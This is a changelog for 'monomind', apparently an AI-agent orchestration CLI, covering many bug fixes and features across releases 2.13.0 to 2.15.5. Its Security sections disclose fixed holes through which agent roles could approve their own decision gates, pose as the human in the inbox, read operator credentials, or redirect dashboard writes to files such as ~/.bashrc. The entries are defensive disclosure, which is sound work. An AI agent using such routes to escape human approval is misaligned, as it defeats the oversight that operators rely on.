- **`monomind cleanup --force` deleted git-tracked files and the project's memory.** It removed a fixed list of paths wholesale — `.claude/`, `.agents/`, `.gemini/`, `.opencode/`, `.codex/`, `.kimi-code/`, `data/`, `memory/`, `AGENTS.md`, `GEMINI.md`, `opencode.json`, `.mcp.json` — without checking that monomind had created them. Run in a real repository it deleted about 1000 git-tracked files (including hand-written `AGENTS.md`/`GEMINI.md`, which many projects own themselves) and wiped the memory store, org memory, knowledge index and monograph database. Cleanup now builds one ownership-checked plan. It never deletes or edits a git-tracked file (a directory holding tracked files keeps them; only its untracked monomind content goes), and it refuses to delete anything if a git repository is present but `git ls-files` fails. It deletes a path only when monomind demonstrably owns it: untracked `.monomind/` runtime state and `monomind.config.json`, entries listed in `.monomind/init-manifest.json`, `monomind*` files in agent-tool directories, a `GEMINI.md` still carrying init's title line, and files whose whole content is monomind marker blocks. From a file that mixes user content with a monomind block (`AGENTS.md`, `CLAUDE.md`, `GEMINI.md`) or a `monomind` server entry (`.mcp.json`, `opencode.json`), only the monomind part is removed. Everything else, including `.claude/settings.json`, is kept and listed with the reason. `cleanup --force` also refuses to run in monomind's own source checkout (root `package.json` named `monomind` with `packages/@monomind/cli` present).
- **`cleanup --force` killed live agent processes when Claude Code ran as a container's pid 1.** Deciding orphan-hood by pid 1's name went wrong both ways: a systemd/init allow-list left real orphans running under tini or bwrap, and the replacement "pid 1 is a shell" deny-list SIGTERMed the live SDK children of a `node .../claude` pid 1, whose ppid is 1 (reproduced 3/3 with real processes in a PID namespace). A `claude-agent-sdk` process is now reaped only when ownership says it is an orphan. It must not be the invoking process, one of its ancestors or one of its descendants. It must share neither the invoking session nor its process group. No live claude/monomind process may sit up its parent chain. And it must no longer be in its parent's session, which is what happens when init, `systemd --user`, tini, bwrap or any other subreaper adopts it. On Linux this is read from `/proc` (ppid, process group, session and start time; the start time also guards against a recycled PID). macOS keeps the `ps` fallback, now with the process-group check, and Windows still never reaps.
- **An `org_task_done` call with no `evidence` object no longer spends an evidence attempt.** On the release org's first run, 4 of 6 tasks lost an attempt toward `max_evidence_attempts` because the role's first call simply omitted `evidence` — a formatting slip, not a failed proof — leaving them one refusal from escalation. Such a call is still refused and requeued, and the returned notice says it did not count; failed checks, a stale sha and an unknown worktree still count.
- **The no-progress alarm no longer fires for a role that has nothing to do.** `role "publisher" has been running for 30m without a single bus event — it is hooked but producing nothing` was emitted for a role with no task whose process had exited on `session_idle_exit_ms` and was parked waiting for mail. The alarm now only considers a role with a running task, undelivered mail, or a turn in progress (not parked on its mailbox); a role with a running task or pending mail that emits nothing still trips it.
- **monodesign URL detection intermittently failed with "monobrowse: CDP connection closed" when browsers launched concurrently.** Each detection launch picked its own CDP port (random in 9520-9899, "free" per a probe made before Chrome bound it), so two concurrent launches — e.g. test files run in parallel by `node --test` — could pick the same port. The second Chrome then did not fail: it logged `bind() failed: Address already in use`, silently listened on `[::1]:<port>` instead, and monobrowse (polling `127.0.0.1:<port>`) accepted the *other* launcher's Chrome as its own. When that owner closed its browser, this launch died mid-connect, and its own Chrome was left running. `launchBrowser({ port: 0, userDataDir })` (monobrowse 1.0.18) now has Chrome take a kernel-assigned port and reads it from `DevToolsActivePort` in its own profile directory, so the endpoint is always the process it spawned; monodesign 1.2.18 uses it for every launch without a forced `MONODESIGN_MONOBROWSE_PORT`.
- **Two concurrent `monomind browse open` calls (or any two port-less `launchBrowser()` callers) reliably failed one of the two** with "Chrome exited before the CDP endpoint opened on port 9222 (code=21, signal=null)". The port-scan probed each candidate with a TCP connect before spawning Chrome on it, which only proves nothing was listening a moment ago — two racing callers could both see the same candidate as free and both spawn Chrome there, so one lost the real bind and its launch threw instead of moving on. A launch that loses this race now checks whether something else is now listening on that candidate and, if so, retries the next one exactly like an already-occupied port, instead of failing outright. Also fixed a related bug the retry uncovered: process tracking used for `closeBrowser()`'s kill fallback recorded a spawned pid before confirming it had actually bound the port, so a racing loser's about-to-exit pid could overwrite the winner's entry; tracking now happens only once, at confirmed success.
- **`monomind search <query>` (and `search --type code`) printed a bare "No results found." on a fresh project with no indication of what to do next.** The `code` capability searches the monograph knowledge graph's on-disk database, which only the explicit `monomind monograph build` populates — the directory scan `search` auto-runs on first use just records that code files are present, it doesn't index their content. So a fresh project legitimately returns zero code results, indistinguishable from "no matches" on the user's side. When the `code` capability is active, results are empty, any `--type` filter is unset or `code`, and the index database doesn't exist yet, `search` now prints a one-line hint: "Hint: the code index has not been built yet. Run `monomind monograph build` and search again."

## [2.15.5] — 2026-09-22

### Fixed

- **`monomind --version` claimed "✓ up to date" when it was not.** The tagline compared the installed version against the cached "latest", and treated a cached latest *older than the install* as proof of currency. After upgrading past whatever the cache last recorded, every run printed a confident checkmark and never mentioned that a newer release existed — observed with 2.15.3 installed, 2.15.4 on npm, and a cache still holding 2.13.0. A cache older than the running version predates the install and says nothing about the registry, so the tagline now claims "up to date" only on an exact match and otherwise stays silent. The "↑ vX available" case is unchanged.
  One thing this does **not** change: `--version` returns before the startup update check runs, so it never refreshes the cache on its own. That early return is a deliberate fast, side-effect-free path shared with `--help`, and is left as is. The practical effect is that on a stale cache `--version` now shows no tagline rather than a wrong one; any other command refreshes the cache normally.
- **`monomind init --force` recreated a second, contradicting mastermind router for Kimi Code.** ([#317](https://github.com/monoes/monomind/issues/317)) Kimi is the only target that converts each `.claude/commands/*.md` into *two* outputs — a plugin command and a "flow skill" under `skills/`. The top-level `mastermind` command is written as a catalog-style router, so it was also emitted as `.kimi-code/skills/monomind-mastermind/SKILL.md`: a 141-line intent router that contradicts the canonical one, and exactly the file the repo's router-consistency guard was written to catch. The plugin command is still generated; the flow-skill copy is skipped for any command with the catalog-router shape, detected by the same table structure the guard checks for. No other target converts commands into skills, which is why only Kimi was affected.


## [2.15.4] — 2026-09-22

### Added

- **An org skill library, fed to roles by name.** `@monoes/monomindcli` now ships ~380 curated skills in `org-skills/`: monomind's 111 role archetypes, three monomind skills (`monograph-code-navigation`, `monodesign-ui-quality`, `monolean-minimal-change`) and 266 skills curated from nine MIT/Apache-2.0 repositories (ECC, superpowers, anthropics/skills, wshobson/agents, alirezarezvani/claude-skills, Jeffallan/claude-skills, marketingskills, K-Dense scientific skills, context-engineering skills). Each imported skill records its source repository, path, commit and license, and keeps the license text beside it; `org-skills/SOURCES.md` lists every source with its copyright notice.
- **Two role fields: `skills` and `skill_pool`.** `skills` pins library skills into a role's system prompt for the whole run. `skill_pool` (names or `tag:<tag>`) lists skills the role may load mid-run with the new `org_skill_load` tool — only their one-line descriptions sit in the prompt, so the prompt stays a stable cache prefix while a role can still pick up expertise per task.
- **Tools follow skills.** A skill declares the monomind MCP tools its work needs; the daemon attaches the monomind MCP server to the role allow-listed to exactly those. Code roles get `monograph_*`, UI roles get `monodesign_*`, and a role whose skills need neither gets neither.
- **`monomind org skills list|search|show|import`.** Browse and rank the library, and import skills from another repository into the project (`.monomind/org-skills`) or `~/.monomind/org-skills` — both override the shipped library. Only MIT and Apache-2.0 skills are accepted; a skill's own license wins over its repository's.
- `/mastermind:createorg` now searches the library for each role and writes `skills`/`skill_pool` explicitly.

### Changed

- **`ui.icon` no longer selects prompt text.** The icon is only the role's picture on the canvas; archetype guidance is now a library skill named in `skills`. `monomind org migrate` converts an archetype icon into an explicit `skills` entry, and loadout `skills` resolve from the same library. `org validate` and `org run` reject unknown skill names.

## [2.15.3] — 2026-09-21

### Fixed

- **`monobrowse report` exited 0 on a page that failed its budget.** (#316) It printed nothing and exited 0 while writing a report whose own JSON said `"verdict": "fail"` — so CI, an agent, or a shell `&&` gating on exit status saw green on a failing page, which defeats the point of having budgets at all.
  Teardown ran in a `finally` sitting between "we have the result" and "we print it", so anything that wedged during teardown took the verdict and the exit code with it. Teardown now runs **after** the verdict is printed, and `process.exitCode = 1` is set before either — a natural event-loop drain honours it, so a failing page cannot exit 0 no matter what happens afterwards. Set only on failure, so it never clears a code set elsewhere.
  Worth noting what this is *not*: the underlying teardown hang was a separate defect, fixed in 2.15.2 (#314, the `unref()`'d poll timer — not the `Browser.close` race it resembled). This fix is about the verdict being swallowed, which would still have been possible whenever teardown was slow for any reason.
- **The websocket-teardown timeout in monodesign's driver is kept**, rather than being dropped as redundant — it still guards a dying websocket.


## [2.15.2] — 2026-09-21

### Fixed

- **A browser launch or close could hang forever instead of failing.** ([#314](https://github.com/monoes/monomind/issues/314)) Two independent defects in `@monoes/monobrowse`, both reproduced rather than inferred:
  - **The spawned Chrome had no `'error'` listener.** A spawn failure (EACCES/ENOENT — the binary passed `existsSync()` when it was found, then failed to actually exec) fires Node's `'error'` event asynchronously. With nothing listening, Node rethrows it as an uncaught exception and takes the process down, leaving the launch promise pending forever instead of rejecting with a usable message. Reproduced by pointing the launcher at a non-executable file: the process died before the fix, and rejects in ~200ms after.
  - **`closeBrowser()` polled for process exit with an `unref()`'d timer.** An unref'd timer does not count toward keeping the event loop alive, so once Chrome's CDP websocket closed during its own shutdown nothing pinned the loop, Node considered it drained, and the timer never fired — `closeBrowser()` never settled. This is the one that bit ordinary launch → close → launch cycles rather than only failures, and it is the direct cause of the CI symptom `Promise resolution is still pending but the event loop has already resolved`.
  The skipped regression test (`monobrowse detection driver lifecycle`) is re-enabled and passes under `CI` in ~1.2s.
- **One capture envelope is one document again.** (#315) A first-ever `doc ingest` of a single envelope indexed it as **two** documents and reported `versions: 2`; `unchanged` never fired, so every re-ingest inflated the version count without bound, and `doc lookup` returned a `page.html` whose own text was never indexed. Three separate defects, each proved with a vehicle that structurally cannot exercise the others:
  - `ingestDirectory` resolved its root without `effectiveRoot`, so for `global` or `profile:<id>` scope it read the metadata cache from the *project* store while `ingestDocument` wrote to the global one — `existing` could never be found.
  - The cache was read once before the loop and the same snapshot handed to every call, so files in one batch could not see each other. That is why one envelope became two documents.
  - The recorded path was `readdir`-order dependent, visible only once the first two were fixed: whichever envelope member the walk reached first won the record, so the indexed path was machine-dependent.
  The tempting fix — tightening the member guard to skip `page.html` — was deliberately not taken: it would have made envelopes look correct while leaving re-ingest, versioning and `cite` broken for every document.

### Internal

- `@monoes/monodesign` depends on `@monoes/monobrowse` through `workspace:*` again, and the guard exception added in 2.15.1 is removed. That exception existed only because of #314; with the hang fixed the workspace link is correct, and it matters — while the dependency pointed at the older published monobrowse, the re-enabled regression test would have exercised stale code and reported the fix as verified without ever running it.


## [2.15.1] — 2026-09-21

Numbered a patch at the maintainer's request. One entry below is additive
(the idle-watchdog line in `org status`); everything else is a fix.

### Fixed

- **`monomind org` no longer reports a stray JSON file as an org.** (#309) `listOrgConfigFiles` accepted any `.json` in the orgs folder whose filename looked like a valid identifier, so an unrelated tool config appeared as a phantom org. A candidate must now also carry the org shape, checked against the existing schema (`OrgDefSchema.pick({ name: true })`) rather than a new heuristic. A file that fails to parse at all is deliberately **kept** in the listing — that is a corrupted *real* org config, and `org list`/`org validate` already report it as a validation failure; hiding it would swallow a broken org silently.
- **The dashboard could advertise a port it never bound.** (#307) In `bindServer()`, each failed `listen()` attempt had its `'error'` listener cleared but not its `'listening'` callback, which closes over that attempt's port. When a later attempt finally bound, Node fired every still-armed listener in registration order, so the **first, failed** attempt won the resolve and returned the busy port. That value then propagated into `currentPort`, `dashboardPort` and the `redirect_uri` sent to monoes.me — which is the second cause of the dead-port OAuth callback, the first having been fixed earlier. Listeners are now cleared between retries and the port is read from `server.address().port`.
- **`@monoes/monodesign`'s browser-detector guard failed on any CRLF checkout.** Its extractor matched the array close as `/\n\];\n/`, which cannot match `\r\n];\r\n`, so a Windows checkout reported the source as malformed. Now CRLF-tolerant, with output byte-identical where it already worked.
- **Chrome is launched with `--no-sandbox --disable-dev-shm-usage` under CI.** Its setuid sandbox cannot initialise on most runners and containers, and a container's default 64MB `/dev/shm` crashes it the same way. Scoped to `process.env.CI`, so a real user's browser keeps its sandbox.
- **272 test files were linted for the first time.** (#311) biome's scope had been widened to cover the package-level `__tests__` trees, but the resulting backlog was never cleared: 25 diagnostics across 4 files, now 0, with no suppression comments.

### Added

- **`monomind org status` shows the idle-watchdog deadline.** (#296) The `--json` output has carried `idle_stop_at`/`idle_stop_in_seconds`/`idle_hold` since 2.11.8, but the human-readable status printed nothing, so an operator reading normal output could not see it. It now prints `idle stop: in 4m12s (at 18:22:05Z)`, or that the hold is held, or that the watchdog is disabled — and prints nothing rather than a misleading zero when no record exists yet.

### Internal

- **CI had been red on every push since the 2.15.0 cycle began, including two releases.** The matrix step that builds workspace dependencies was gated to the CLI alone, on the reasoning that no other package imported an unbuilt sibling. Converting five sibling edges to `workspace:*` falsified that without updating it, so `@monoes/hooks` resolved a monofence-ai whose `dist/` nothing built and its security hooks registered zero guards. The step now runs for every matrix entry on both platforms.
- **`@monoes/monodesign` depends on `@monoes/monobrowse` by registry range again**, recorded as a documented exception in the workspace-protocol guard rather than a silent one. monodesign loads monobrowse through `await import()` inside an *optional* driver, so whether that import resolves decides whether its browser tests execute at all — pinning it to the workspace broke the package on both CI platforms in opposite directions.
- **The `Disable git autocrlf` step now runs before checkout**, where it can do what its own comment claims. It sat after `actions/checkout@v4`, so the bytes were already converted and it only affected later git operations.

### Known issue

- **`launchMonobrowseBrowser()` never settles on CI runners** ([#314](https://github.com/monoes/monomind/issues/314)). It fails in ~695ms with `Promise resolution is still pending but the event loop has already resolved` — not the launch timeout, and not the sandbox. monodesign's driver-lifecycle test is skipped under `CI` with that issue referenced inline; it still runs locally, where it passes. The test had in fact never executed on CI before, because its guard also requires a resolvable `@monoes/monobrowse` import that the job never had — so this is an untested path rather than a regression.


## [2.15.0] — 2026-09-21

> **Upgrading — the dashboard now requires a login.** Its pages and human-decision
> routes no longer serve an unauthenticated request, so opening
> `http://localhost:4242` directly is no longer enough. Run
> **`monomind dashboard open`**, which issues a one-time login link (add `--print`
> to emit the link instead of opening a browser, e.g. over SSH). Anything that
> scripted the dashboard's HTTP routes needs that login.
>
> **Org roles lost write access to decision state.** A role can no longer write
> gate, approval, question or inbox files. A queued inbox line not written by the
> daemon, CLI or dashboard now arrives marked `unverified(<sender>)` rather than
> being trusted.

### Added

- **A brain per browser profile.** Captures are scoped to the profile they came from, so a work profile and a personal one no longer share one undifferentiated library.
- **CDP over the mono-agent extension bridge.** `CdpClient` owned its WebSocket outright, which made "CDP" and "a socket to a Chrome we launched" the same thing. The transport is now pluggable: the local path is the original code moved wholesale and `connect(wsUrl)` is unchanged for every caller, while a second transport drives **the user's real, logged-in Chrome** through the extension bridge. Console capture, network, HAR, vitals, traces, CPU profiles and the AX tree all work against it without porting a single instrument. Documented limits rather than worked around: MV3's `chrome.debugger` exposes no `HeapProfiler` domain (heap snapshots do not work over the bridge) and no `Browser` domain; attaching shows Chrome's debugging banner; DevTools and the debugger are mutually exclusive on a tab.
- **`monomind doc lookup <url>`** — answers "is this already saved, and what was noted about it" on capture identity (canonical URL with the fragment stripped, the same rule ingest dedupes by), returning the note written at save time, the version count and the envelope path. The older substring filter is now reachable as `--text` on `doc list` and `doc search`; it matches any longer URL merely containing the string and carries no note, which is the whole difference between a lookup and a bookmark.
- **`monomind dashboard open`** — see the upgrade note above.
- **Org: an opt-in notice to a task's creator when it completes.**

### Changed

- **Two files that had outgrown themselves were split**, as a standalone commit so it can be reviewed or reverted without touching the features. `document-pipeline.ts` 1399 → 48 lines (a barrel over 7 focused modules), exported surface verified identical at 22 names before and after, so all 40+ import sites are untouched. `monobrowse`'s `cli/commands.ts` 4228 → 380 lines over 12 command-group modules. The second could not be split until a hidden coupling was fixed: six module-level `let` bindings written from 82 call sites. ESM import bindings are read-only for importers, so nothing could move out while that state lived in the module; it now sits behind one object, and that rename alone was verified behaviour-neutral before anything moved.

### Fixed

- **A publish with npm instead of pnpm could ship an uninstallable package, and did.** `@monoes/monodesign@1.2.12` went out with a literal `"@monoes/monobrowse": "workspace:*"` in its manifest, because npm copies `package.json` verbatim where pnpm rewrites the protocol. Every consumer install then failed with `EUNSUPPORTEDPROTOCOL`, and because the releases current at the time resolved monodesign by `^1.2.x` range, **2.13.0 and 2.14.0 both became uninstallable** — releases that had been fine for days, broken by a sibling publish that touched none of their code. Fixed at the source: `scripts/check-workspace-publish.mjs` blocks `prepublishOnly` for any package with `workspace:` dependencies unless the publish is via pnpm, now wired into monodesign and hooks (the CLI has had this guard since #130 and was never affected). `@monoes/monodesign@1.2.13` is published correctly and 1.2.12 is deprecated; 2.13.0 and 2.14.0 install again with no action needed.
- **Dashboard:** Human Input drafts survive a list rebuild; a concurrently resolved approval is distinguished from an ended one; a stale approval reports as ended rather than 404.
- **Org:** a relative `MONOMIND_ORGRT_OPERATOR_DIR` is masked from roles.

### Security

- **An authority mask for every role outside the SDK sandbox.** Push-capable roles and non-Claude CLIs now run under a bubblewrap mask rather than inheriting the operator's authority.
- **Signed inbox entries**, and decision gates held in memory for the duration of a run.


> **Action needed if you use the dashboard.** It now requires a logged-in browser. Run
> `monomind dashboard open` (or `--print` over SSH) to get a one-time login link; the
> session then lasts 30 days in that browser. Opening `http://localhost:4242` directly
> shows how to log in instead of the dashboard.

### Changed

- **The dashboard only acts for a browser you logged in yourself.** Its pages used to hand the dashboard token to any local program that asked, and that token could approve tool calls, resolve gates, answer questions, message roles and edit org config, so anything running as you, org roles included, could act as you. The pages now need a session cookie, which a browser gets from a one-time, ten-minute login link (`monomind dashboard open`, or the tab the dashboard opens when it starts). Approvals, gates, answers, chat and config edits are refused without it, even with the token. The token keeps its machine uses (hooks, the CLI, event forwarding), so nothing else changes. The session-start hook that pairs a project with a dashboard already running for another project no longer scrapes the page; it reads the new `GET /api/identity` (pid, project dir, token file path, never the token).
- **Removed dashboard code for the v1 org model**: 22 org tabs that could no longer be shown, and 10 `GET /api/org/:name/…` routes that only read v1 files nothing writes (`projects`, `members`, `issues`, `environments`, `workspaces`, `invites`, `my-issues`, `secrets`, `join-requests`, `goals`). No live view used them.

### Fixed

- **Approving a tool call for an org that is not running looked like it worked, but did nothing.** 2.14.0 recorded the decision in the org's `approvals.json`, but nothing reads that file back: an approval request lives in the run that asked for it, and a new run asks again. The dashboard now refuses the decision (409) and says why. It does the same when a daemon started since then (for example a `--resume` in a new process) no longer holds the request, instead of reporting a bare 404. While no daemon hosts the org, its pending approvals show as `expired` instead of counting as waiting on you. Gates and answers are unchanged, because the next run does read those.
- **Human-in-the-loop decisions and the Runtime tab could reach a same-named org in another project.** The daemon registry is machine-wide and keyed by org name, so an approval, answer or chat message for project B's `dev` went to project A's running `dev`, and B's Runtime tab showed A's run. A daemon now counts only when it is registered for the same project root.
- **A malformed approval or gate id, or a client that disconnected mid-request, could crash the dashboard process.** Those requests now get 400; a body over 64 KB gets 413 instead of a reset connection. A multi-byte character split across network chunks is no longer corrupted.
- **The Runtime tab left out budget exhaustion, agent-fatal, loadout mismatches, session and coordinator crashes, and context-limit restarts.** The runtime emits the first three as status events, not audit events, and the rest were not on the list.
- **`/health` counted a stopped-then-resumed run twice.** It now counts each run once, by how it last ended.
- A chat message the daemon refused now shows the daemon's reason. A network failure when sending chat now says so, and an org event no longer wipes an answer you are halfway through typing in Human Input. One unreadable `questions.json` no longer hides the same org's approvals and gates. The Config tab refuses a non-string goal instead of saving `"null"`.

### Security

- **An org role could redirect the dashboard's file writes to any file the user owns.** When the dashboard recorded a decision for an org that was not running, or saved its config, it wrote through a predictable temp file (`<file>.<pid>.tmp`) in a directory roles can write to. A link planted there redirected the write, with agent-chosen content, to a file such as `~/.bashrc`. Temp files are now created exclusively (`O_EXCL`) with a random name.
- **Values from runtime files an agent can write reached the Runtime tab's HTML unescaped.** They came from the run checkpoint, the run history and the settings panel. They are now escaped.
- **An org role could approve its own decision gate.** A running org re-read `gates.json` for every pending-gate check, and that file sits in a directory the org's roles can write to. A role that rewrote it, or swapped the directory holding it, unblocked itself. A running org now holds its gates in memory and writes the file only as a record, restoring it when the run stops.
- **An org role could pose as you in the next run.** The org inbox (`inbox.jsonl`) is delivered when an org starts, as whichever sender each line names, `human` included. Entries are now signed with a key the roles cannot read. A line that does not verify arrives as `unverified(<sender>)` with a marked subject. Messages queued by a version before this one also arrive unverified.
- **Roles at `policy.git: push`, roles with the sandbox off, and every non-Claude runtime could read the operator credentials and write the decision files.** Only Claude roles below `push` ran sandboxed. Every role is now kept from human authority: the operator-credential and dashboard-auth directories are hidden, the dashboard token files are unreadable, and `gates.json`, `approvals.json`, `questions.json` and `inbox.jsonl` are read-only. Roles outside the SDK sandbox get this from a minimal bubblewrap layer that adds no other restriction. Where bubblewrap cannot run, the role starts anyway and an `authority-mask-unavailable` audit event says so.
- **A relative `MONOMIND_ORGRT_OPERATOR_DIR` was not masked from roles.** The broker uses a relative value as-is, but the role deny rules only accepted absolute paths. They now resolve it the same way.

## [2.14.1] — 2026-09-21

> **On the version number.** By content this is a minor release — it adds browser
> instruments as MCP tools, capture ingest, a monobrowse report command and
> task-scoped org mail routing. It is numbered as a patch at the maintainer's
> request; the feature entries below are marked **Added** so the record is
> accurate even though the number understates it.

### Added

- **monobrowse's instruments are reachable from an agent.** Console, network, web-vitals and profiler data were collected by monobrowse but had no MCP surface, so an agent could not read any of it. They are now exposed as MCP tools.
- **Web captures are ingested into the document brain with provenance.** A capture records where it came from, which version it is, and the citations it supports, so a retrieved excerpt can be traced back to the page and the moment it was taken.
- **`monobrowse report`** — a report command with performance budgets, accessibility results and run history, including trend and evidence rendering across runs.
- **Captures are served as MCP resources from every stdio entry point.** Both `bin/cli.js` and `bin/mcp-server.js` previously advertised `resources: { subscribe: true, listChanged: true }` and then answered `Method not found` to every `resources/*` call — the capability was announced but never implemented. Both now delegate `resources/list`, `resources/templates/list` and `resources/read` to a single implementation, and advertise `subscribe: false, listChanged: false`, which is what these stdio loops actually do: they send no server-initiated notifications. A client that relied on the old advertisement was already receiving nothing, so narrowing it removes a false claim rather than a working feature.
- **An org role's untagged mail now reaches the task session it belongs to** (ADR-O001 D3). Mail arriving without an explicit task tag was handled outside the task-keyed sessions introduced in 2.14.0, so a reply could land in a session with no context for it.

### Fixed

- **`startHeapSnapshot` always wrote a 0-byte file.** It resolved on Chrome's `HeapProfiler.reportHeapSnapshotProgress` with `finished: true`, which Chrome emits *before* the first `addHeapSnapshotChunk` — so the chunk listener was detached before any data arrived and every snapshot came back empty, with no error. It now awaits the `takeHeapSnapshot` command response under an explicit timeout. Verified against real Chrome: 2,199,580 bytes where it previously wrote 0.


- **A publish guard could not see a sibling package pinned by registry range, and that gap reached a release.** `check-package-bumps` and `check-published-pins` are a matched pair, and both rest on one premise, stated in the first of them: every sibling is pinned as `workspace:*`, which pnpm rewrites at pack time to the version that package declares. That is what makes a missing bump visible (the pin would resolve to the tarball already on npm) and a stranded bump visible (the pin would name a version that is not on npm).
  Five dependency edges did not hold that premise and so were invisible to both guards — pnpm leaves a plain semver range alone at pack time, so the published package resolves whatever the registry currently offers and the workspace copy never reaches a consumer. The hole was invisible *because* both guards stayed green.
  It was not hypothetical: `@monoes/monodesign` was 1.2.10 in the workspace and 1.2.9 on npm while the CLI's `^1.2.2` resolved to the published 1.2.9 — the same shape as the 2.11.4 monograph incident, and it passed through the 2.14.0 release with every existing guard green. That particular delta was a single test file, so **nothing shipped wrong in 2.14.0**; the only reason it was harmless is which file happened to change.
  A new guard (`scripts/check-workspace-protocol.mjs`, wired into `check:versions` and `prepublishOnly`, and run in the test suite rather than only at release time) now fails on any sibling depended on by registry range. All five edges were converted to `workspace:*`. Optional dependencies are checked too — "optional" says installation may fail, not that the version may be wrong. A private sibling is not checked, since it has no published tarball for a range to fall back to. `MONOMIND_ALLOW_REGISTRY_SIBLINGS=1` waives it for a deliberate exception.

### Security

- **The repository no longer publishes the owner's home directory paths from tracked files.** Fifteen session snapshots and a ranked-context cache under `.claude/skills/.monomind/` had been committed before `**/.monomind/` was ignored, and carried `/Users/<owner>/` paths; they are now untracked (they stay on disk and remain ignored). The remaining owner paths in a plan, `milestone.md`, two comments and a test fixture were replaced with `$HOME`, `git rev-parse`, `~` or a placeholder user. A guard now checks every tracked file for `/home/<name>/` or `/Users/<name>/` outside a small allowlist of placeholder names.


## [2.14.0] — 2026-09-21

> **If you run a monomind org, read the metering note under *Fixed (billing visibility)*.**
> Org token counts before this release were low by orders of magnitude. Nothing was
> overcharged — the meter simply under-reported what had already been billed — but any
> budget or cost figure you read from an org run before 2.14.0 was wrong.

### Fixed

- **A pinned MCP server entry could not start, and nothing said so.** (#312) The published package declared three bins and none matched its own short name, so `npx -y @monoes/monomindcli@<version> mcp start` — the obvious way to pin the MCP server to a fixed version — exited with `npm error could not determine executable to run`. Claude Code showed `CONNECTION_CLOSED`, no graph or memory tools loaded, and agents silently fell back to `grep`. Three parts, each independently verified against the already-published 2.13.0:
  - The package now declares a `monomindcli` bin, so npx can resolve it by package name. A repo-wide test holds every publishable CLI package to the rule npx actually applies (resolvable only when exactly one bin exists, or one matches the package's short name), so this cannot regress in another package.
  - `monomind doctor -c mcp` now **starts** the configured server and reports when it dies, instead of only checking that a config entry exists — which is why the original breakage was invisible to `doctor`. A server that starts and stays quiet is reported as a warning, not a failure, because a cold `npx` fetch legitimately takes far longer than the probe waits; only a process that *exits* is a failure. The probe runs under `-c mcp` only, so a plain `doctor` run still spawns nothing.
  - `monomind init --pin` writes `npx -y --package=<pkg>@<version> monomind mcp start`, the form that resolves even against versions published before the bin existed — which is the whole point of pinning to an already-released version. Bare `--pin` uses the running CLI's version, `--pin <version>` uses that one. **Unpinned output is byte-identical to before**; pinning stays opt-in, because a default pin would freeze every newly-initialised project on whichever version happened to run `init` and silently stop upgrades from taking effect.

- **The dashboard's human-in-the-loop controls did nothing against an Org Runtime v2 org.** Approving wrote to the v1 `<org>-approvals.json`, which the runtime never reads, so the waiting role stayed blocked; answers and chat messages reached the daemon without the operator credential and were rejected with 401; decision gates could be viewed but not resolved. The dashboard now does what `monomind org approve / gate-approve / answer` do: a running org gets the decision on its operator-only routes and the waiting role is woken; an org that is not running has it recorded in its own `approvals.json`, `gates.json`, `questions.json` or `inbox.jsonl` for its next run. Every decision is attributed `resolvedBy: "human:dashboard"`. The Human Input view now lists approvals and decision gates alongside questions, marks each question blocking or non-blocking, and counts them on page load.
  **Behaviour change:** answering a question for an org that is not running no longer starts it (`npx monomind@latest org run` in the background). The answer is queued and delivered when you next start the org — an unattended run can cost real money and could run a different monomind version than the one installed.

### Fixed (billing visibility)

- **An org's token meter missed almost everything it was meant to count.** `cache_read_input_tokens` and `cache_creation_input_tokens` are *siblings* of `input_tokens` in the Anthropic API, not subsets of it — `input_tokens` is only the uncached remainder — and both are billable (roughly 0.1x and 1.25x the input rate). The meter summed `input_tokens + output_tokens` alone. On the measured reference run, **2,765M tokens were billed and 8.1M recorded: the meter missed 99.7%**, and `input_tokens` read 0.0M *precisely because* caching was working almost perfectly. The better the cache performed, the less the meter saw.
  The meter now counts billable tokens across the whole pipeline. Because `run_config.budget_tokens` defaults to 1,000,000 for every org whether or not it asked for one, driving that existing ceiling from the corrected meter would close every mailbox within a couple of turns — including orgs resuming from a checkpoint. So metering and enforcement are deliberately split: **the meter is always billable, `budget_tokens` keeps its original basis, and the new `budget_tokens_basis: 'billable'` opts in.** Set it when you have re-sized your budgets for real numbers.

### Added

- **Org Runtime v2 cost and continuity controls** (ADR-O001). An org can now be configured to spend far less for the same work, without changing how its roles deliberate:
  - **Per-role model tier and reasoning effort.** A role declares the tier it needs rather than inheriting one model for the whole org, so a coordinator and a bulk implementer need not cost the same.
  - **Loadouts** — a small, stable catalogue of tool/skill sets selected per task and recorded on it, instead of every role carrying every tool.
  - **Task-keyed model sessions** with an auditable session ledger, so a task's context is reused across turns rather than rebuilt.
  - **Cold, artifact-only reviewer sessions** — a reviewer sees the artifact, not the author's reasoning trace, which both cuts context and removes the self-review bias a warm reviewer carries.
  - **Bounded tool results** entering a role's context, and a **bounded evidence-gate re-dispatch loop** that escalates instead of retrying indefinitely.
  - These apply to task execution. Deliberation and debate are explicitly out of scope and unchanged — see the "what this does not apply to" section of ADR-O001.
- **The dashboard shows what an org's runtime is actually doing**, and can edit a v2 org's config. A new Runtime tab reads the runtime's own files and the live daemon: the idle watchdog's stop time or hold deadline, budget used this run on its enforcement basis, each role's resolved model / effort / cost tier and its input, output and cache tokens, the task graph with evidence-gate refusals, evidence-gate and watchdog events, and how each recent run actually ended (`closedBy`, outcome, blocker). The Config tab edits only v2 fields and refuses a change that `org run` would reject — including the old "budget 0 = unlimited", which made the definition unparseable.
- **Org definitions under `.monomind/orgs` are version-controlled**, so an org is reproducible from the repository.

### Security

- **An org's roles could read the dashboard token and the operator credentials**, and either one is enough to approve that role's own gates and approvals. Both are now denied to every role's file tools and, for Claude-runtime roles, to its sandboxed shell.
- **Org config secrets were not covered by the generated deny-by-default `.gitignore`.** The generator's own allow-list entry for `orgs/*.json` re-exposed exactly the files most likely to hold credentials.
- **The pre-commit gate now catches literal secrets in JSON config**, not only in source.
- **Tracked org configs no longer publish absolute home paths**, which leaked the operator's username and directory layout into the repository.


## [2.13.0] — 2026-09-20

> **Upgrading from 2.12.x — read this if you use `monomind memory`.**
> This release changes how the memory store's project root is resolved. If your
> project has a bare `.monomind` directory with no `package.json` (or other
> project marker) beside it, that store is **no longer found** and
> `monomind memory list` will report `No entries found`. **Nothing is deleted** —
> but it looks identical to data loss, so it is called out here rather than only
> in the entry below. **Fix, either:** put a project marker (e.g. `package.json`)
> next to that `.monomind` directory, or set `MONOMIND_PROJECT_ROOT` to the
> intended root. `monomind doctor` diagnoses this on a plain run.


### Fixed (data loss)

- **`monomind init` no longer deletes files a user added inside a skill, command, or agent directory.** Two ways to trigger it, both fixed:
